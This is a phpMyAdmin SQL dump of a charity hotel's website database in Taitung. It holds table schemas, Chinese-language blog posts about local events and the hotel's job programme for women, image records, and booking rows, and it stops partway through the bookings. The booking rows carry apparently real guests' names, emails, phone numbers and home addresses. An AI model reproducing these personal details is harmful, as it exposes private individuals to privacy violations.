-- phpMyAdmin SQL Dump
-- version 4.9.5deb2
-- https://www.phpmyadmin.net/
--
-- 主機： localhost:3306
-- 產生時間： 2023 年 10 月 11 日 04:12
-- 伺服器版本： 10.3.38-MariaDB-0ubuntu0.20.04.1
-- PHP 版本： 7.4.3-4ubuntu2.19

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- 資料庫： `resort2022`
--

-- --------------------------------------------------------

--
-- 資料表結構 `pm_activity`
--

CREATE TABLE `pm_activity` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `max_children` int(11) DEFAULT 1,
  `max_adults` int(11) DEFAULT 1,
  `max_people` int(11) DEFAULT NULL,
  `title` varchar(250) DEFAULT NULL,
  `subtitle` varchar(250) DEFAULT NULL,
  `alias` varchar(100) DEFAULT NULL,
  `descr` longtext DEFAULT NULL,
  `duration` float DEFAULT 0,
  `duration_unit` varchar(50) DEFAULT NULL,
  `price` double DEFAULT 0,
  `lat` double DEFAULT NULL,
  `lng` double DEFAULT NULL,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_activity_file`
--

CREATE TABLE `pm_activity_file` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `id_item` int(11) NOT NULL,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 1,
  `rank` int(11) DEFAULT 0,
  `file` varchar(250) DEFAULT NULL,
  `label` varchar(250) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_activity_session`
--

CREATE TABLE `pm_activity_session` (
  `id` int(11) NOT NULL,
  `id_activity` int(11) NOT NULL,
  `days` varchar(20) DEFAULT NULL,
  `start_date` int(11) DEFAULT NULL,
  `end_date` int(11) DEFAULT NULL,
  `price` double DEFAULT 0,
  `price_child` double DEFAULT 0,
  `discount` double DEFAULT 0,
  `discount_type` varchar(10) DEFAULT NULL,
  `id_tax` int(11) DEFAULT NULL,
  `taxes` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_activity_session_hour`
--

CREATE TABLE `pm_activity_session_hour` (
  `id` int(11) NOT NULL,
  `id_activity_session` int(11) NOT NULL,
  `start_h` int(11) DEFAULT NULL,
  `start_m` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_article`
--

CREATE TABLE `pm_article` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `title` varchar(250) DEFAULT NULL,
  `subtitle` varchar(250) DEFAULT NULL,
  `alias` varchar(100) DEFAULT NULL,
  `text` longtext DEFAULT NULL,
  `url` varchar(250) DEFAULT NULL,
  `tags` varchar(250) DEFAULT NULL,
  `id_page` int(11) DEFAULT NULL,
  `users` text DEFAULT NULL,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0,
  `add_date` int(11) DEFAULT NULL,
  `edit_date` int(11) DEFAULT NULL,
  `publish_date` int(11) DEFAULT NULL,
  `unpublish_date` int(11) DEFAULT NULL,
  `comment` int(11) DEFAULT 0,
  `rating` int(11) DEFAULT 0,
  `show_langs` text DEFAULT NULL,
  `hide_langs` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_article`
--

INSERT INTO `pm_article` (`id`, `lang`, `title`, `subtitle`, `alias`, `text`, `url`, `tags`, `id_page`, `users`, `home`, `checked`, `rank`, `add_date`, `edit_date`, `publish_date`, `unpublish_date`, `comment`, `rating`, `show_langs`, `hide_langs`) VALUES
(1, 1, 'Mon premier article', '', 'mon-premier-article', '<p>Lorem ipsum dolor sit amet consectetur adipiscing elit. Nullam molestie, nunc eu consequat varius, nisi metus iaculis nulla, nec ornare odio leo quis eros. Donec gravida eget velit eget pulvinar. Phasellus eget est quis est faucibus condimentum. Morbi tellus turpis, posuere vel tincidunt non, varius ac ante. Suspendisse in sem neque. Donec et faucibus justo. Nulla vitae nisl lacus. Fusce tincidunt quam nec vestibulum vestibulum. Vivamus vulputate, nunc non ullamcorper mattis, nunc orci imperdiet nulla, at laoreet ipsum nisl non leo. Aenean dapibus aliquet sem, ut lacinia magna mattis in.</p><p>Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Curabitur tempor arcu eu sapien ullamcorper sodales. Aenean eu massa in ante commodo scelerisque vitae sed sapien. Aenean eu dictum arcu. Mauris ultricies dolor eu molestie egestas.<br>Proin feugiat, nunc at pellentesque fringilla, ex purus efficitur dolor, ac pretium odio lacus id leo. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Suspendisse eu ipsum viverra dolor tempus vehicula eu eu risus. Praesent rutrum dapibus odio, nec accumsan justo fermentum in. Ut quis neque a ante facilisis bibendum.</p>', '', '', 18, '1', 0, 1, 1, 1644370645, 1656298304, NULL, NULL, 0, 0, '', ''),
(1, 2, '準備性就業服務', '', 'dfsdf', '<p>就是提供弱勢婦女短期、安全的工作場所，藉由友善工作環境及就業社工的專業輔導，協助受暴婦女提早適應職場，增進工作職能與職場人際互動關係，培養就業自信及就業能力後，協助婦女進入一般職場。在這裡我們提供一個準職場的職業訓練場域，讓弱勢婦女和她們的孩子看到未來與希望，到愛馨會館住宿，除了享受這裡舒適的環境與台東的好山好水，也希望你看見她們的努力，與我們一同開啟她們的希望之門。</p>', '', '', 18, '1', 0, 1, 1, 1644370645, 1656298304, NULL, NULL, 0, 0, '', ''),
(1, 3, '', '', '', '', '', '', 18, '1', 0, 1, 1, 1644370645, 1656298304, NULL, NULL, 0, 0, '', ''),
(1, 5, '準備性就業服務', '', 'dfsdf', '<p>就是提供弱勢婦女短期、安全的工作場所，藉由友善工作環境及就業社工的專業輔導，協助受暴婦女提早適應職場，增進工作職能與職場人際互動關係，培養就業自信及就業能力後，協助婦女進入一般職場。在這裡我們提供一個準職場的職業訓練場域，讓弱勢婦女和她們的孩子看到未來與希望，到愛馨會館住宿，除了享受這裡舒適的環境與台東的好山好水，也希望你看見她們的努力，與我們一同開啟她們的希望之門。</p>', '', '', 18, '1', 0, 1, 1, 1644370645, 1656298304, NULL, NULL, 0, 0, '', ''),
(4, 1, 'Première gallery', '', 'premiere-gallery', '', '', '', 7, '1', 0, 3, 4, 1644370645, 1644370645, NULL, NULL, 0, 0, NULL, NULL),
(4, 2, 'First gallery', '', 'first-gallery', '', '', '', 7, '1', 0, 3, 4, 1644370645, 1644370645, NULL, NULL, 0, 0, NULL, NULL),
(4, 3, 'First gallery', '', 'first-gallery', '', '', '', 7, '1', 0, 3, 4, 1644370645, 1644370645, NULL, NULL, 0, 0, NULL, NULL),
(4, 5, 'First gallery', '', 'first-gallery', '', '', '', 7, '1', 0, 3, 4, 1644370645, 1644370645, NULL, NULL, 0, 0, NULL, NULL),
(5, 2, 'DragonRaja', '', 'dragonraja', '<p>韓國知名奇幻小說改編線上遊戲：龍族回歸</p>', '', '', 19, '1', 0, 2, 5, 1657098155, 1657098271, 1657098060, NULL, 0, NULL, '', ''),
(5, 5, 'DragonRaja', '', 'dragonraja', '<p>韓國知名奇幻小說改編線上遊戲：龍族回歸</p>', '', '', 19, '1', 0, 2, 5, 1657098155, 1657098271, 1657098060, NULL, 0, NULL, '', ''),
(6, 2, '虎年祈安清醮', '圖/文 By Joanne', 'yearoftiger', '<p>台東市每十二年會舉行一次虎年祈安清醮，這已成為台東地方盛事之一。我是第一年參與這樣的祈神求福過程，有著與老台東人不一樣的(看熱鬧)心情。</p><p>建醮期間在臺東各處搭起七座壇，偶爾在晚上遇到，便會生出一種尋到寶的興奮之情。而且在建醮期間通常需要齋戒，祈求做醮成功、合境平安。但聽到別人説“做醮啦，全市要吃素三天，市場也沒肉賣”的時候，還是有點不太敢相信。</p><p>直到這幾天臺東很多素食店或者非素食店都打起廣告:做醮期間免費提供素食，看著滿街大排長龍的隊伍，才真正有點佩服到。</p><p>今天，虎年祈安清醮算是完滿結束，吃肉獸們也出關了。無論怎樣，懷著美好的心願，祈求風調雨順、國泰民安。</p>', '', '', 19, '1', 0, 1, 6, 1664260141, 1665017048, 1664258400, NULL, 0, NULL, '', ''),
(6, 5, '虎年祈安清醮', '圖/文 By Joanne', 'yearoftiger', '<p>台東市每十二年會舉行一次虎年祈安清醮，這已成為台東地方盛事之一。我是第一年參與這樣的祈神求福過程，有著與老台東人不一樣的(看熱鬧)心情。</p><p>建醮期間在臺東各處搭起七座壇，偶爾在晚上遇到，便會生出一種尋到寶的興奮之情。而且在建醮期間通常需要齋戒，祈求做醮成功、合境平安。但聽到別人説“做醮啦，全市要吃素三天，市場也沒肉賣”的時候，還是有點不太敢相信。</p><p>直到這幾天臺東很多素食店或者非素食店都打起廣告:做醮期間免費提供素食，看著滿街大排長龍的隊伍，才真正有點佩服到。</p><p>今天，虎年祈安清醮算是完滿結束，吃肉獸們也出關了。無論怎樣，懷著美好的心願，祈求風調雨順、國泰民安。</p>', '', '', 19, '1', 0, 1, 6, 1664260141, 1665017048, 1664258400, NULL, 0, NULL, '', ''),
(7, 2, '2022彩虹市集', '圖/文 By Joanne', 'lgbtqfriendly', '<p>#同志友善旅店 值得大力推薦<br>這是週末的臺東鐵路步道，這裏有一場臺東同寮舉辦的彩虹市集：<br>有人在遛狗，<br>有人在舞臺賣力唱歌，<br>有人圍坐在草地上聊天，<br>有人排起了隊在等待一場戲劇，<br>有人不斷在愛馨會館的攤位前路過，和自己的朋友或家人漫步在秋日的微風裡。<br>每個片段互相穿透互相溫暖，<br>讓你覺得這個世界正處在它最美的時間裡，<br>讓你不忍心，浪費它的一絲一毫。</p>', '', '', 19, '1', 0, 1, 7, 1665017331, 1665017331, 1664258400, NULL, 0, NULL, '', ''),
(7, 5, '2022彩虹市集', '圖/文 By Joanne', 'lgbtqfriendly', '<p>#同志友善旅店 值得大力推薦<br>這是週末的臺東鐵路步道，這裏有一場臺東同寮舉辦的彩虹市集：<br>有人在遛狗，<br>有人在舞臺賣力唱歌，<br>有人圍坐在草地上聊天，<br>有人排起了隊在等待一場戲劇，<br>有人不斷在愛馨會館的攤位前路過，和自己的朋友或家人漫步在秋日的微風裡。<br>每個片段互相穿透互相溫暖，<br>讓你覺得這個世界正處在它最美的時間裡，<br>讓你不忍心，浪費它的一絲一毫。</p>', '', '', 19, '1', 0, 1, 7, 1665017331, 1665017331, 1664258400, NULL, 0, NULL, '', ''),
(8, 2, '九月台東', '圖/文 By Joanne', 'septembertaitung', '<p>九月臺東，颱風刮了幾次擦邊球，但也無損秋高氣爽的如約而至，反而因爲下了幾場大雨，讓你某天抬頭，就能看到藍得不像樣子的天空。是的，一旦你在臺東住下來，就算只是看著藍天白雲，也會覺得幸福。</p>', '', '', 19, '1', 0, 1, 8, 1665017489, 1665017489, 1664258400, NULL, 0, NULL, '', ''),
(8, 5, '九月台東', '圖/文 By Joanne', 'septembertaitung', '<p>九月臺東，颱風刮了幾次擦邊球，但也無損秋高氣爽的如約而至，反而因爲下了幾場大雨，讓你某天抬頭，就能看到藍得不像樣子的天空。是的，一旦你在臺東住下來，就算只是看著藍天白雲，也會覺得幸福。</p>', '', '', 19, '1', 0, 1, 8, 1665017489, 1665017489, 1664258400, NULL, 0, NULL, '', ''),
(9, 2, '鄭宜農住愛馨', '文 By Ellen', 'ennointhehouse', '<p>謝謝人美，心美，聲音美的宜農熱情推薦愛馨會館。<br>記得宜農在鐵花村演唱時說，打開會館的房間陽台看到兩隻鳥在很近很近的欄杆上看著她，讓她在演唱之前心情很好。那天晚上的表演在那樣很好很舒服的狀態下進行，安可欲罷不能。<br>覺得能給別人幸福感的宜農好可愛。<br>很高興宜農在愛馨會館感覺到被照顧。</p>', '', '', 19, '1', 0, 1, 9, 1665017676, 1665017676, 1664258400, NULL, 0, NULL, '', ''),
(9, 5, '鄭宜農住愛馨', '文 By Ellen', 'ennointhehouse', '<p>謝謝人美，心美，聲音美的宜農熱情推薦愛馨會館。<br>記得宜農在鐵花村演唱時說，打開會館的房間陽台看到兩隻鳥在很近很近的欄杆上看著她，讓她在演唱之前心情很好。那天晚上的表演在那樣很好很舒服的狀態下進行，安可欲罷不能。<br>覺得能給別人幸福感的宜農好可愛。<br>很高興宜農在愛馨會館感覺到被照顧。</p>', '', '', 19, '1', 0, 1, 9, 1665017676, 1665017676, 1664258400, NULL, 0, NULL, '', ''),
(10, 2, '立秋', '圖/文 By Joanne', 'autumniscoming', '<p>今日立秋。晚上的臺東街道，風是首先降溫的，它說夏天要接近尾聲了。<br>突然就覺得遺憾起來。我還沒有開車去都蘭的咖啡廳拍貓，也沒有去説好的綠島游泳，沒有看到三仙臺的日出，甚至還沒給那個誰寄出伯朗大道的明信片。就只是平平淡淡地吃了幾碗冰、熬了很多晚夜，然後夏天就要過去了。</p>', '', '', 19, '1', 0, 1, 10, 1665017803, 1665017803, 1664258400, NULL, 0, NULL, '', ''),
(10, 5, '立秋', '圖/文 By Joanne', 'autumniscoming', '<p>今日立秋。晚上的臺東街道，風是首先降溫的，它說夏天要接近尾聲了。<br>突然就覺得遺憾起來。我還沒有開車去都蘭的咖啡廳拍貓，也沒有去説好的綠島游泳，沒有看到三仙臺的日出，甚至還沒給那個誰寄出伯朗大道的明信片。就只是平平淡淡地吃了幾碗冰、熬了很多晚夜，然後夏天就要過去了。</p>', '', '', 19, '1', 0, 1, 10, 1665017803, 1665017803, 1664258400, NULL, 0, NULL, '', ''),
(11, 2, '活水湖', '圖/文 By Joanne', 'flowinglake', '<p>暑假的活水湖特別熱鬧：騎腳踏車的、散步的、訓練的、游泳的、划船的、甚至只是來拍照的，它比任何一個季節都顯得更有生氣。</p><p>這個卑南溪湧泉地/輕艇、帆船訓練場/國際三鐵指定比賽場所，雖然目前管理上不盡如人意，仍然吸引國內外無數水上活動/大自然愛好者前來一探究竟，它的魅力何在？只有身歷其境才能知曉。</p>', '', '', 19, '1', 0, 1, 11, 1665017924, 1665017924, 1664258400, NULL, 0, NULL, '', ''),
(11, 5, '活水湖', '圖/文 By Joanne', 'flowinglake', '<p>暑假的活水湖特別熱鬧：騎腳踏車的、散步的、訓練的、游泳的、划船的、甚至只是來拍照的，它比任何一個季節都顯得更有生氣。</p><p>這個卑南溪湧泉地/輕艇、帆船訓練場/國際三鐵指定比賽場所，雖然目前管理上不盡如人意，仍然吸引國內外無數水上活動/大自然愛好者前來一探究竟，它的魅力何在？只有身歷其境才能知曉。</p>', '', '', 19, '1', 0, 1, 11, 1665017924, 1665017924, 1664258400, NULL, 0, NULL, '', ''),
(12, 2, '台灣國際熱氣球嘉年華在台東', '圖/文 By Joanne', 'taiwaninternationalballoonfestival', '<p>每年台灣國際熱氣球嘉年華的舉辦，讓臺東裏裏外外變成了一個熱鬧的城市；但每每到了這個時候，我就會確切感受到，這一年其實已經過半了。</p><p>半，其實是華人的哲學。以前我也常常追求完美，不可逆的遺憾也就慢慢變成了心病，現在想明白了，原來：人生一半在於我，另外一半聽自然。</p>', '', '', 19, '1', 0, 1, 12, 1665477028, 1665477028, 1664258400, NULL, 0, NULL, '', ''),
(12, 5, '台灣國際熱氣球嘉年華在台東', '圖/文 By Joanne', 'taiwaninternationalballoonfestival', '<p>每年台灣國際熱氣球嘉年華的舉辦，讓臺東裏裏外外變成了一個熱鬧的城市；但每每到了這個時候，我就會確切感受到，這一年其實已經過半了。</p><p>半，其實是華人的哲學。以前我也常常追求完美，不可逆的遺憾也就慢慢變成了心病，現在想明白了，原來：人生一半在於我，另外一半聽自然。</p>', '', '', 19, '1', 0, 1, 12, 1665477028, 1665477028, 1664258400, NULL, 0, NULL, '', ''),
(13, 2, '2022池上秋收', '圖/文 By Joanne', '2022autumnharvest', '<p>秋收藝術節是池上的年度盛事，已經成為島內的一個獨特旅遊品牌，也是身為池上人的e編引以為傲的一件事。</p><p>2022年的日期跟節目出爐囉，歡迎愛馨會館的朋友來池上作客。</p>', '', '', 19, '1', 0, 1, 13, 1665477099, 1665477211, 1664258400, NULL, 0, NULL, '', ''),
(13, 5, '2022池上秋收', '圖/文 By Joanne', '2022autumnharvest', '<p>秋收藝術節是池上的年度盛事，已經成為島內的一個獨特旅遊品牌，也是身為池上人的e編引以為傲的一件事。</p><p>2022年的日期跟節目出爐囉，歡迎愛馨會館的朋友來池上作客。</p>', '', '', 19, '1', 0, 1, 13, 1665477099, 1665477211, 1664258400, NULL, 0, NULL, '', ''),
(14, 2, '我們是公益旅館', '圖/文 By Joanne', 'wearecharityhotel', '<p>作為一家公益旅館，愛馨一樓大廳常常會被租用舉辦很多活動，也見證著無數的社福網絡人員、民眾、婦女甚至兒童因為不一樣的訓練而獲得新的想法、甚至新的人生規劃。</p><p>如果您恰巧碰上了這樣的活動、還頗感興趣，歡迎向工作人員進行垂詢，或者駐足停留幾秒，給予他們熱切和鼓勵的眼神。</p><p>有些時候，入住愛馨會館常常會讓您的旅程不只是一趟旅程而已。</p>', '', '', 19, '1', 0, 1, 14, 1665477386, 1665477386, 1664258400, NULL, 0, NULL, '', ''),
(14, 5, '我們是公益旅館', '圖/文 By Joanne', 'wearecharityhotel', '<p>作為一家公益旅館，愛馨一樓大廳常常會被租用舉辦很多活動，也見證著無數的社福網絡人員、民眾、婦女甚至兒童因為不一樣的訓練而獲得新的想法、甚至新的人生規劃。</p><p>如果您恰巧碰上了這樣的活動、還頗感興趣，歡迎向工作人員進行垂詢，或者駐足停留幾秒，給予他們熱切和鼓勵的眼神。</p><p>有些時候，入住愛馨會館常常會讓您的旅程不只是一趟旅程而已。</p>', '', '', 19, '1', 0, 1, 14, 1665477386, 1665477386, 1664258400, NULL, 0, NULL, '', ''),
(15, 2, '忘憂谷', '圖/文 By Joanne', 'worryfreevalley', '<p><span style=\"color:hsl(0, 0%, 0%);\">充滿才華的畫家—艾格尼絲．馬丁（Agnes Martin）說過：當一朵美麗的玫瑰死去時，美並不會隨著凋零，因為它並不在玫瑰本身。美是內心的一種意識。</span></p>', '', '', 19, '1', 0, 1, 15, 1665477582, 1665477582, 1664258400, NULL, 0, NULL, '', ''),
(15, 5, '忘憂谷', '圖/文 By Joanne', 'worryfreevalley', '<p><span style=\"color:hsl(0, 0%, 0%);\">充滿才華的畫家—艾格尼絲．馬丁（Agnes Martin）說過：當一朵美麗的玫瑰死去時，美並不會隨著凋零，因為它並不在玫瑰本身。美是內心的一種意識。</span></p>', '', '', 19, '1', 0, 1, 15, 1665477582, 1665477582, 1664258400, NULL, 0, NULL, '', '');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_article_file`
--

CREATE TABLE `pm_article_file` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `id_item` int(11) NOT NULL,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 1,
  `rank` int(11) DEFAULT 0,
  `file` varchar(250) DEFAULT NULL,
  `label` varchar(250) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_article_file`
--

INSERT INTO `pm_article_file` (`id`, `lang`, `id_item`, `home`, `checked`, `rank`, `file`, `label`, `type`) VALUES
(4, 1, 4, 0, 1, 4, 'sample4.jpg', '', 'image'),
(4, 2, 4, 0, 1, 4, 'sample4.jpg', '', 'image'),
(4, 3, 4, 0, 1, 4, 'sample4.jpg', '', 'image'),
(4, 5, 4, 0, 1, 4, 'sample4.jpg', '', 'image'),
(6, 1, 1, NULL, 1, 5, '279845792-5051899448231233-6650788516501447721-n.jpg', '', 'image'),
(6, 2, 1, NULL, 1, 5, '279845792-5051899448231233-6650788516501447721-n.jpg', '', 'image'),
(6, 3, 1, NULL, 1, 5, '279845792-5051899448231233-6650788516501447721-n.jpg', '', 'image'),
(6, 5, 1, NULL, 1, 5, '279845792-5051899448231233-6650788516501447721-n.jpg', '', 'image'),
(7, 2, 5, NULL, 1, 2, '10-1024-768.jpg', '', 'image'),
(7, 5, 5, NULL, 1, 2, '10-1024-768.jpg', '', 'image'),
(8, 2, 5, NULL, 1, 4, '11-1024-768.jpg', '', 'image'),
(8, 5, 5, NULL, 1, 4, '11-1024-768.jpg', '', 'image'),
(9, 2, 5, NULL, 1, 3, '32-1024-768.jpg', '', 'image'),
(9, 5, 5, NULL, 1, 3, '32-1024-768.jpg', '', 'image'),
(10, 2, 5, NULL, 1, 1, '27-1024-768.jpg', '', 'image'),
(10, 5, 5, NULL, 1, 1, '27-1024-768.jpg', '', 'image'),
(11, 2, 6, NULL, 1, 6, '306625054-8073083486100306-2876706749643784593-n.jpg', '', 'image'),
(11, 5, 6, NULL, 1, 6, '306625054-8073083486100306-2876706749643784593-n.jpg', '', 'image'),
(12, 2, 6, NULL, 1, 7, '306633709-8073083379433650-453316464159381610-n.jpg', '', 'image'),
(12, 5, 6, NULL, 1, 7, '306633709-8073083379433650-453316464159381610-n.jpg', '', 'image'),
(13, 2, 6, NULL, 1, 8, '309099738-8073083976100257-5454392973612105128-n.jpg', '', 'image'),
(13, 5, 6, NULL, 1, 8, '309099738-8073083976100257-5454392973612105128-n.jpg', '', 'image'),
(14, 2, 7, NULL, 1, 9, '310128227-8106654696076518-525401053632042294-n.jpg', NULL, 'image'),
(14, 5, 7, NULL, 1, 9, '310128227-8106654696076518-525401053632042294-n.jpg', NULL, 'image'),
(15, 2, 7, NULL, 1, 10, '309243682-8106654526076535-4640743395324285819-n.jpg', NULL, 'image'),
(15, 5, 7, NULL, 1, 10, '309243682-8106654526076535-4640743395324285819-n.jpg', NULL, 'image'),
(16, 2, 7, NULL, 1, 11, '309108267-8106654139409907-4962789896200601358-n.jpg', NULL, 'image'),
(16, 5, 7, NULL, 1, 11, '309108267-8106654139409907-4962789896200601358-n.jpg', NULL, 'image'),
(17, 2, 8, NULL, 1, 12, '306274778-8021654247909897-6793258837933303728-n.jpg', NULL, 'image'),
(17, 5, 8, NULL, 1, 12, '306274778-8021654247909897-6793258837933303728-n.jpg', NULL, 'image'),
(18, 2, 9, NULL, 1, 13, '.jpg', NULL, 'image'),
(18, 5, 9, NULL, 1, 13, '.jpg', NULL, 'image'),
(19, 2, 10, NULL, 1, 14, '297181801-7842780672463923-677829492113647963-n.jpg', NULL, 'image'),
(19, 5, 10, NULL, 1, 14, '297181801-7842780672463923-677829492113647963-n.jpg', NULL, 'image'),
(20, 2, 11, NULL, 1, 15, '295973406-7811530065588984-1264142125263727591-n.jpg', NULL, 'image'),
(20, 5, 11, NULL, 1, 15, '295973406-7811530065588984-1264142125263727591-n.jpg', NULL, 'image'),
(21, 2, 11, NULL, 1, 16, '296714616-7811530592255598-87612483754560992-n.jpg', NULL, 'image'),
(21, 5, 11, NULL, 1, 16, '296714616-7811530592255598-87612483754560992-n.jpg', NULL, 'image'),
(22, 2, 12, NULL, 1, 17, '295664994-7780804415328216-3642615288033053909-n.jpg', NULL, 'image'),
(22, 5, 12, NULL, 1, 17, '295664994-7780804415328216-3642615288033053909-n.jpg', NULL, 'image'),
(23, 2, 12, NULL, 1, 18, '294704931-7780804198661571-2751735537188028685-n.jpg', NULL, 'image'),
(23, 5, 12, NULL, 1, 18, '294704931-7780804198661571-2751735537188028685-n.jpg', NULL, 'image'),
(25, 2, 13, NULL, 1, 2, '290300408-2185182594991619-8737271715426074877-n.jpg', NULL, 'image'),
(25, 5, 13, NULL, 1, 2, '290300408-2185182594991619-8737271715426074877-n.jpg', NULL, 'image'),
(26, 2, 14, NULL, 1, 19, '290310753-7680592272016098-5786730471391131862-n.jpg', NULL, 'image'),
(26, 5, 14, NULL, 1, 19, '290310753-7680592272016098-5786730471391131862-n.jpg', NULL, 'image'),
(27, 2, 15, NULL, 1, 20, '289848097-7648959671846025-8341048102170710140-n.jpg', NULL, 'image'),
(27, 5, 15, NULL, 1, 20, '289848097-7648959671846025-8341048102170710140-n.jpg', NULL, 'image'),
(28, 2, 15, NULL, 1, 21, '288993974-7648958458512813-232461445202982568-n.jpg', NULL, 'image'),
(28, 5, 15, NULL, 1, 21, '288993974-7648958458512813-232461445202982568-n.jpg', NULL, 'image'),
(29, 2, 15, NULL, 1, 22, '289413197-7648958568512802-2332440797624311191-n.jpg', NULL, 'image'),
(29, 5, 15, NULL, 1, 22, '289413197-7648958568512802-2332440797624311191-n.jpg', NULL, 'image'),
(30, 2, 15, NULL, 1, 23, '288325211-7648960121845980-1030286918840426548-n.jpg', NULL, 'image'),
(30, 5, 15, NULL, 1, 23, '288325211-7648960121845980-1030286918840426548-n.jpg', NULL, 'image');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_booking`
--

CREATE TABLE `pm_booking` (
  `id` int(11) NOT NULL,
  `add_date` int(11) DEFAULT NULL,
  `edit_date` int(11) DEFAULT NULL,
  `from_date` int(11) DEFAULT NULL,
  `to_date` int(11) DEFAULT NULL,
  `nights` int(11) DEFAULT 0,
  `adults` int(11) DEFAULT 1,
  `children` int(11) DEFAULT 1,
  `tourist_tax` float DEFAULT NULL,
  `discount` float DEFAULT NULL,
  `id_coupon` int(11) DEFAULT NULL,
  `ex_tax` float DEFAULT NULL,
  `tax_amount` float DEFAULT NULL,
  `total` float DEFAULT NULL,
  `down_payment` float DEFAULT NULL,
  `paid` float DEFAULT NULL,
  `balance` float DEFAULT NULL,
  `id_user` int(11) DEFAULT NULL,
  `firstname` varchar(50) DEFAULT NULL,
  `lastname` varchar(50) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL,
  `company` varchar(50) DEFAULT NULL,
  `address` varchar(250) DEFAULT NULL,
  `postcode` varchar(10) DEFAULT NULL,
  `city` varchar(100) DEFAULT NULL,
  `phone` varchar(50) DEFAULT NULL,
  `mobile` varchar(50) DEFAULT NULL,
  `country` varchar(100) NOT NULL,
  `comments` text DEFAULT NULL,
  `status` int(11) DEFAULT 1,
  `trans` varchar(50) DEFAULT NULL,
  `payment_date` int(11) DEFAULT NULL,
  `payment_option` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_booking`
--

INSERT INTO `pm_booking` (`id`, `add_date`, `edit_date`, `from_date`, `to_date`, `nights`, `adults`, `children`, `tourist_tax`, `discount`, `id_coupon`, `ex_tax`, `tax_amount`, `total`, `down_payment`, `paid`, `balance`, `id_user`, `firstname`, `lastname`, `email`, `company`, `address`, `postcode`, `city`, `phone`, `mobile`, `country`, `comments`, `status`, `trans`, `payment_date`, `payment_option`) VALUES
(28, 1667437717, NULL, 1668816000, 1668902400, 1, 1, NULL, NULL, 0, NULL, 2200, 0, 2200, NULL, NULL, NULL, NULL, '慕華', '莊', 'nelleven@gmail.com', '', '', '', '', '', '0933787349', '', '', 1, NULL, NULL, 'arrival'),
(29, 1667983724, 1667983724, 1668211200, 1668297600, 1, 6, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '簡', '名弘', 's10017@goh.org.tw', '', '台東市中興路一段110號', '950', '台東', '', '0928542052', '', '', 4, NULL, NULL, ''),
(30, 1667984210, 1667984210, 1668297600, 1668384000, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '1', '1', '1', '', '1', '1', '1', '', '1', '', '', 4, NULL, NULL, ''),
(31, 1667984229, 1667984243, 1668729600, 1668816000, 1, 6, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '簡', '名弘', 's10017@goh.org.tw', '', '台東市中興路一段110號', '950', '台東', '', '0928542052', '', '', 4, NULL, NULL, ''),
(32, 1667985341, 1667985341, 1668902400, 1669766400, 10, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '1', '1', '1', '', '1', '1', '1', '', '1', '', '', 4, NULL, NULL, ''),
(33, 1668002675, 1668041306, 1671840000, 1671926400, 1, 2, 0, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '姿伃', '盧', 'naomi098721@gmail.com', '', '高雄市前鎮區沱江街176號', '806', '高雄市前鎮區沱江街176號', '0987213357', '0987213357', '', '', 4, NULL, NULL, 'arrival'),
(34, 1668071940, NULL, 1668816000, 1668902400, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '書雲', '楊', 'b40135123@gmail.com', '', '', '', '', '', '0979922405', '', '', 1, NULL, NULL, 'arrival'),
(36, 1668134403, NULL, 1669334400, 1669420800, 1, 1, 1, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, 1, 'Administrator', '鄭', 'goh2078@goh.org.tw', '', '隨意', '236', '天龍國', '', '0981761985', '', '', 1, NULL, NULL, 'arrival'),
